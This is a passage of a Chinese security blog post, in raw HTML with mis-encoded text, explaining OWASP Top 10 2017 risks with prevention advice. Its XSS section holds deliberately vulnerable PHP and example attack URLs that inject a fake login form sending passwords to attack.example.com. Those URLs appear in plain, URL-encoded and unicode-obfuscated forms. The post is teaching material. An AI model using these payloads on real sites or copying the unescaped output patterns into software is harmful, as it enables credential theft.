title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>xssæ”»å‡»å…¨ç§°ä¸º<a href="https://baike.baidu.com/item/XSSæ”»å‡»/954065?fr=aladdin">è·¨ç«™è„šæœ¬æ”»å‡»</a>,å½“åº”ç”¨ç¨‹åºçš„æ–°ç½‘é¡µä¸­åŒ…å«ä¸å—ä¿¡ä»»çš„ã€æœªç»æ°å½“éªŒè¯ã€è½¬ä¹‰çš„æ•°æ®æˆ–å¯ä»¥ä½¿ç”¨HTMLã€JavaScriptçš„æµè§ˆå™¨APIæ›´æ–°çš„ç°æœ‰ç½‘é¡µæ—¶ï¼Œå°±ä¼šå‡ºç°xssæ¼æ´ï¼Œè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æœ€æ™®éçš„webåº”ç”¨å®‰å…¨æ¼æ´ï¼Œç”šè‡³åœ¨æŸäº›å®‰å…¨å¹³å°éƒ½å­˜åœ¨xssæ¼æ´ã€‚xssä¼šæ‰§è¡Œæ”»å‡»è€…åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œçš„è„šæœ¬ï¼Œå¹¶åŠ«æŒç”¨æˆ·ä¼šè¯ï¼Œç ´åç½‘ç«™æˆ–ç”¨æˆ·é‡å®šå‘åˆ°æ¶æ„ç«™ç‚¹ï¼Œä½¿ç”¨xssè¿˜å¯ä»¥æ‰§è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p><h4 id="Example-6"><a href="#Example-6" class="headerlink" title="Example"></a>Example</h4><h5 id="åå°„å‹XSS"><a href="#åå°„å‹XSS" class="headerlink" title="åå°„å‹XSS"></a>åå°„å‹XSS</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div class="header"> Welcome, '</span> <span class="token operator">.</span> <span class="token variable">$username</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span></code></pre><p>ä»¥ä¸Šä»£ç åŸºäºHTTP GETç”¨æˆ·åå‚æ•°åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºæ¬¢è¿æ¶ˆæ¯ã€‚</p><p>ç”±äºå‚æ•°å¯ä»¥æ˜¯ä»»æ„çš„ï¼Œå› æ­¤å¯ä»¥ä¿®æ”¹é¡µé¢çš„urlï¼Œå› æ­¤<code>$username</code>å¯ä»¥åŒ…å«è„šæœ¬è¯­æ³•ï¼Œä¾‹å¦‚ï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=&lt;Script Language="Javascript">alert("You've been attacked!");&lt;/Script></code></pre><p>è¿™æ ·ä¼šå¼¹å‡ºæ— å®³çš„è­¦å‘Šå¯¹è¯æ¡†ï¼Œæœ€åˆè¿™ä¸æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ¼æ´ï¼Œæ¯•ç«Ÿï¼Œä¸ºä»€ä¹ˆæœ‰äººè¾“å…¥ä¸€ä¸ªå¯¼è‡´æ¶æ„ä»£ç åœ¨å…¶è‡ªå·±çš„è®¡ç®—æœºä¸Šè¿è¡Œçš„URLï¼ŸçœŸæ­£çš„å±é™©åœ¨äºï¼Œæ”»å‡»è€…å°†åˆ›å»ºæ¶æ„URLï¼Œç„¶åä½¿ç”¨ç”µå­é‚®ä»¶æˆ–ç¤¾äº¤å·¥ç¨‹æŠ€å·§è¯±ä½¿å—å®³è€…è®¿é—®URLçš„é“¾æ¥ã€‚å½“å—å®³è€…å•å‡»é“¾æ¥æ—¶ï¼Œä»–ä»¬ä¼šé€šè¿‡æ˜“å—æ”»å‡»çš„Webåº”ç”¨ç¨‹åºä¸ç»æ„åœ°å°†æ¶æ„å†…å®¹åæ˜ å›è‡ªå·±çš„è®¡ç®—æœºã€‚æ›´ç°å®çš„æ˜¯ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨é¡µé¢ä¸ŠåµŒå…¥ä¸€ä¸ªä¼ªé€ çš„ç™»å½•æ¡†ï¼Œè¯±ä½¿ç”¨æˆ·å°†ç”¨æˆ·çš„å¯†ç å‘é€ç»™æ”»å‡»è€…ï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=&lt;div id="stealPassword">Please Login:&lt;form name="input" action="http://attack.example.com/stealPassword.php" method="post">Username: &lt;input type="text" name="username" />&lt;br/>Password: &lt;input type="password" name="password" />&lt;br/>&lt;input type="submit" value="Login" />&lt;/form>&lt;/div></code></pre><p>å¦‚æœç”¨æˆ·å•å‡»æ­¤é“¾æ¥ï¼Œé‚£ä¹ˆWelcome.phpå°†ç”Ÿæˆä»¥ä¸‹HTMLå¹¶å°†å…¶å‘é€åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Welcome, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stealPassword<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Please Login:    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>attack.example.com/stealPassword.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        Username: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        Password: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>ä½†æ˜¯ï¼Œç²¾æ˜çš„ç”¨æˆ·å¯èƒ½ä¼šæ³¨æ„åˆ°URLä¸Šé™„åŠ äº†å¯ç–‘æ–‡æœ¬ã€‚æ”»å‡»è€…å¯èƒ½è¿›ä¸€æ­¥æ··æ·†URLï¼ˆä»¥ä¸‹ç¤ºä¾‹é“¾æ¥åˆ†ä¸ºå¤šè¡Œä»¥æé«˜å¯è¯»æ€§ï¼‰ï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A+%3Cinput+type%3D%22password%22+name%3D%22password%22+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</code></pre><p>ç›¸åŒçš„æ”»å‡»å­—ç¬¦ä¸²ä¹Ÿå¯èƒ½è¢«æ··æ·†ä¸ºï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript">document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script></code></pre><p>è¿™ä¸¤ä¸ªæ”»å‡»é“¾æ¥éƒ½å°†å¯¼è‡´é¡µé¢ä¸Šæ˜¾ç¤ºä¼ªé€ çš„ç™»å½•æ¡†ï¼Œå¹¶ä¸”ç”¨æˆ·æ›´æœ‰å¯èƒ½å¿½ç•¥URLæœ«å°¾çš„éš¾ä»¥ç†è§£çš„æ–‡æœ¬ã€‚</p><h5 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h5><p>CreateUser.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fullName</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$fullName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Insert Into users (username,password) Values ("%s","%s","%s")'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">crypt</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$fullName</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ListUsers.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Select * From users Where loggedIn=true'</span><span class="token punctuation">;</span><span class="token variable">$results</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$results</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//Print list of users to page</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div id="userlist">Currently Active Users:'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$results</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div class="userNames">'</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fullname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span></code></pre><p>ä»¥ä¸Šçš„webåº”ç”¨ç¨‹åºç”±ä¸¤ä¸ªç‹¬ç«‹çš„é¡µé¢ç»„æˆï¼Œä¸€ä¸ªé¡µé¢ç”¨äºåˆ›å»ºç”¨æˆ·çš„è´¦æˆ·ï¼Œå¦å¤–ä¸€ä¸ªé¡µé¢ç”¨äºåˆ—å‡ºå½“å‰ç™»å½•çš„æ´»åŠ¨ç”¨æˆ·</p><p>æ”»å‡»è€…å¯ä»¥å°†å…¶åç§°è®¾ç½®ä¸ºä»»æ„HTMLï¼Œç„¶åå°†å…¶æ˜¾ç¤ºç»™â€œæ´»åŠ¨ç”¨æˆ·â€é¡µé¢çš„æ‰€æœ‰è®¿é—®è€…ã€‚è¯¥HTMLä¾‹å¦‚å¯ä»¥æ˜¯çªƒå–ç™»å½•æ¶ˆæ¯çš„å¯†ç ã€‚</p><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (â€˜Cross-site Scriptingâ€™)</a></p><h4 id="Prevent-6"><a href="#Prevent-6" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>ä½¿ç”¨è®¾è®¡ä¸Šè‡ªåŠ¨è½¬ä¹‰XSSçš„æ¡†æ¶ï¼Œä¾‹å¦‚æœ€æ–°çš„Ruby on Rails, React JSï¼Œäº†è§£æ¯ä¸ªæ¡†æ¶çš„XSSä¿æŠ¤çš„å±€é™æ€§ï¼Œå¹¶é€‚å½“å¤„ç†æœªæ¶µç›–çš„ç”¨ä¾‹</li><li>æ ¹æ®HTMLè¾“å‡ºä¸­çš„ä¸Šä¸‹æ–‡ï¼ˆæ­£æ–‡ï¼Œå±æ€§ï¼ŒJavaScriptï¼ŒCSSï¼Œæˆ–URLï¼‰è½¬ä¹‰ä¸å—ä¿¡ä»»çš„HTTPè¯·æ±‚æ•°æ®å°†è§£å†³XSSæ¼æ´</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">A7:2017-Cross-Site Scripting (XSS)</a></p><h3 id="ä¸å®‰å…¨çš„ååºåˆ—åŒ–"><a href="#ä¸å®‰å…¨çš„ååºåˆ—åŒ–" class="headerlink" title="ä¸å®‰å…¨çš„ååºåˆ—åŒ–"></a>ä¸å®‰å…¨çš„ååºåˆ—åŒ–</h3><h4 id="ç®€ä»‹-7"><a href="#ç®€ä»‹-7" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ä¸å®‰å…¨çš„ååºåˆ—åŒ–å¯ä»¥å¯¼è‡´<a href="https://baike.baidu.com/item/è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/2491231?fr=aladdin">è¿œç¨‹ä»£ç æ‰§è¡Œ</a>ã€<a href="https://baike.baidu.com/item/é‡æ”¾æ”»å‡»?fromtitle=é‡æ’­æ”»å‡»&fromid=19455997">é‡æ”¾æ”»å‡»</a>ã€æ³¨å…¥æ”»å‡»æˆ–ç‰¹æƒå‡çº§æ”»å‡»</p><h4 id="Example-7"><a href="#Example-7" class="headerlink" title="Example"></a>Example</h4><p>å‚è€ƒæœ¬ç«™ï¼š</p><ul><li><a href="https://www.extrader.top/posts/bb56c28a/">pharååºåˆ—åŒ–æµ…æ</a></li><li><a href="https://www.extrader.top/posts/488d0f65/">pythonååºåˆ—åŒ–æ¼æ´æµ…æ</a></li><li><a href="https://www.extrader.top/posts/d3333ead/">ctf-ååºåˆ—åŒ–</a></li></ul><h4 id="Prevent-7"><a href="#Prevent-7" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>åœ¨æ‰€æœ‰åºåˆ—åŒ–å¯¹è±¡ä¸Šå®æ–½å®Œæ•´æ€§æ£€æŸ¥ï¼Œä¾‹å¦‚æ•°å­—ç­¾åï¼Œä»¥é˜²æ­¢æ¶æ„åˆ›å»ºå¯¹è±¡æˆ–ç¯¡æ”¹æ•°æ®ã€‚</li><li>åœ¨å¯¹è±¡åˆ›å»ºä¹‹å‰çš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¼ºåˆ¶æ‰§è¡Œä¸¥æ ¼çš„ç±»å‹çº¦æŸï¼Œå› ä¸ºä»£ç é€šå¸¸å¸Œæœ›ä½¿ç”¨ä¸€ç»„å¯å®šä¹‰çš„ç±»ã€‚</li><li>éš”ç¦»å¹¶è¿è¡Œå¯èƒ½åœ¨ä½ç‰¹æƒç¯å¢ƒä¸­ååºåˆ—åŒ–çš„ä»£ç ã€‚</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">A8:2017-Insecure Deserialization</a></p><h3 id="ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶"><a href="#ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶" class="headerlink" title="ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶"></a>ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶</h3><h4 id="ç®€ä»‹-8"><a href="#ç®€ä»‹-8" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p><a href="https://baike.baidu.com/item/ç»„ä»¶/6902128?fr=aladdin">ç»„ä»¶</a>(egï¼šåº“ã€æ¡†æ¶æˆ–å…¶ä»–è½¯ä»¶æ¨¡å—)æ‹¥æœ‰åº”ç”¨ç¨‹åºç›¸åŒçš„æƒé™ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä¸­å«æœ‰å·²çŸ¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¼æ´è·å–æ•°æ®æˆ–æ¥ç®¡æœåŠ¡å™¨ã€‚åŒæ—¶ï¼Œä½¿ç”¨è¿™äº›ç»„ä»¶ä¼šç ´ååº”ç”¨ç¨‹åºé˜²å¾¡ï¼Œé€ æˆå„ç§æ”»å‡»äº§ç”Ÿä¸¥é‡çš„åæœã€‚</p><h4 id="Example-8"><a href="#Example-8" class="headerlink" title="Example"></a>Example</h4><p>å‚è€ƒæœ¬ç«™ï¼š</p><ul><li><a href="https://www.extrader.top/posts/67caa546/">CTF-CVE</a></li></ul><p>æ¼æ´æŸ¥æ‰¾ï¼š</p><p><a href="https://www.cvedetails.com/version-search.php">MITERå¸¸è§æ¼æ´å’ŒæŠ«éœ²ï¼ˆCVEï¼‰æœç´¢</a></p><p><a href="https://nvd.nist.gov/">NVDæ¼æ´æ•°æ®åº“</a></p><h4 id="Prevent-8"><a href="#Prevent-8" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>ä½¿ç”¨è¯¸å¦‚<a href="https://www.mojohaus.org/versions-maven-plugin/">version</a>ï¼Œ<a href="https://owasp.org/www-project-dependency-check">DependencyCheck</a>ï¼Œ<a href="https://github.com/retirejs/retire.js/">retire.js</a>ç­‰å·¥å…·ï¼Œè¿ç»­æ¸…ç‚¹å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ç»„ä»¶ï¼ˆä¾‹å¦‚ï¼Œæ¡†æ¶ï¼Œåº“ï¼‰çš„<a href="https://www.mojohaus.org/versions-maven-plugin/">ç‰ˆæœ¬</a>åŠå…¶ä¾èµ–<a href="https://github.com/retirejs/retire.js/">é¡¹</a>ã€‚æŒç»­ç›‘è§†<a href="https://cve.mitre.org/">CVE</a>å’Œ<a href="https://nvd.nist.gov/">NVD</a>ç­‰æ¥æºçš„ç»„ä»¶ä¸­çš„æ¼æ´ã€‚ä½¿ç”¨è½¯ä»¶ç»„æˆåˆ†æå·¥å…·æ¥è‡ªåŠ¨åŒ–è¯¥è¿‡ç¨‹ã€‚è®¢é˜…ç”µå­é‚®ä»¶è­¦æŠ¥ä»¥è·å–ä¸æ‚¨ä½¿ç”¨çš„ç»„ä»¶ç›¸å…³çš„å®‰å…¨æ¼æ´ã€‚</li><li>ä»…é€šè¿‡å®‰å…¨é“¾æ¥ä»å®˜æ–¹æ¥æºè·å–ç»„ä»¶ã€‚ä¼˜å…ˆé€‰æ‹©ç»è¿‡ç­¾åçš„è½¯ä»¶åŒ…ï¼Œä»¥å‡å°‘åŒ…å«ç»è¿‡ä¿®æ”¹çš„æ¶æ„ç»„ä»¶çš„æœºä¼šã€‚</li><li>ç›‘è§†æœªç»´æŠ¤çš„åº“å’Œç»„ä»¶æˆ–æœªä¸ºæ—§ç‰ˆæœ¬åˆ›å»ºå®‰å…¨è¡¥ä¸çš„ç»„ä»¶ã€‚å¦‚æœæ— æ³•ä¿®è¡¥ï¼Œè¯·è€ƒè™‘éƒ¨ç½²<a href="https://owasp.org/www-community/Virtual_Patching_Best_Practices">è™šæ‹Ÿä¿®è¡¥ç¨‹åº</a>ä»¥ç›‘è§†ï¼Œæ£€æµ‹æˆ–é˜²æ­¢å‘ç°çš„é—®é¢˜ã€‚</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9:2017-Using Components with Known Vulnerabilities</a></p><h3 id="ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§"><a href="#ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§" class="headerlink" title="ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§"></a>ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§</h3><h4 id="ç®€ä»‹-9"><a href="#ç®€ä»‹-9" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§ï¼Œä»¥åŠäº‹ä»¶å“åº”ç¼ºå¤±æˆ–æ— æ•ˆçš„é›†æˆï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿè¿›ä¸€æ­¥æ”»å‡»ç³»ç»Ÿã€ä¿æŒæŒç»­æ€§çš„æˆ–æ”»å‡»æ›´å¤šçš„ç³»ç»Ÿï¼Œä»¥åŠå¯¹æ•°æ®çš„ä¸å½“æ“ä½œã€‚</p><h4 id="Example-9"><a href="#Example-9" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">authenticate</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">incrementLoginAttempts</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">recentLoginAttempts</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed login attempt by User: "</span> <span class="token operator">.</span> <span class="token variable">$userName</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" at "</span> <span class="token operator">+</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ä»¥ä¸Šä»£ç è®°å½•å¯ç–‘çš„å¤šæ¬¡ç™»å½•å°è¯•ã€‚</p><p>æ­¤ä»£ç ä»…åœ¨è¾¾åˆ°ç‰¹å®šé™åˆ¶æ—¶è®°å½•å¤±è´¥çš„ç™»å½•å°è¯•ã€‚å¦‚æœæ”»å‡»è€…çŸ¥é“æ­¤é™åˆ¶ï¼Œåˆ™å¯ä»¥é€šè¿‡é¿å…è¯¥é™åˆ¶æ¥é˜»æ­¢å‘ç°æ”»å‡»ã€‚</p><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Omission of Security-relevant Information</a></p><h4 id="Prevent-9"><a href="#Prevent-9" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>ç¡®ä¿å¯ä»¥ä½¿ç”¨è¶³å¤Ÿçš„ç”¨æˆ·ä¸Šä¸‹æ–‡è®°å½•æ‰€æœ‰ç™»å½•ï¼Œè®¿é—®æ§åˆ¶å¤±è´¥å’ŒæœåŠ¡å™¨ç«¯è¾“å…¥éªŒè¯å¤±è´¥çš„äº‹ä»¶ï¼Œä»¥è¯†åˆ«å¯ç–‘æˆ–æ¶æ„å¸æˆ·ï¼Œå¹¶ä¿ç•™è¶³å¤Ÿçš„æ—¶é—´ä»¥è¿›è¡Œå¤„ç†ã€‚</li><li>ç¡®ä¿ä»¥ä¸€ç§é›†ä¸­å¼æ—¥å¿—ç®¡ç†è§£å†³æ–¹æ¡ˆå¯ä»¥è½»æ¾ä½¿ç”¨çš„æ ¼å¼ç”Ÿæˆæ—¥å¿—ã€‚</li><li>ç¡®ä¿é«˜ä»·å€¼äº¤æ˜“å…·æœ‰å®Œæ•´æ€§æ§åˆ¶çš„å®¡è®¡è·Ÿè¸ªï¼Œä»¥é˜²æ­¢ç¯¡æ”¹æˆ–åˆ é™¤ï¼Œä¾‹å¦‚ä»…è¿½åŠ æ•°æ®åº“è¡¨æˆ–ç±»ä¼¼å†…å®¹ã€‚</li><li>å»ºç«‹æœ‰æ•ˆçš„ç›‘è§†å’Œè­¦æŠ¥ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å¹¶åº”å¯¹å¯ç–‘æ´»åŠ¨ã€‚</li><li>å»ºç«‹æˆ–é‡‡ç”¨äº‹ä»¶å“åº”å’Œæ¢å¤è®¡åˆ’ï¼Œä¾‹å¦‚<a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a>æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">A10:2017-Insufficient Logging &amp; Monitoring</a></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://owasp.org/www-project-top-ten/2017/Top_10">OWASP Top 10 Application Security Risks - 2017</a></li><li><a href="https://blog.csdn.net/wang_624/article/details/89683571">OWASP Top 10 ç®€å•ä»‹ç»</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
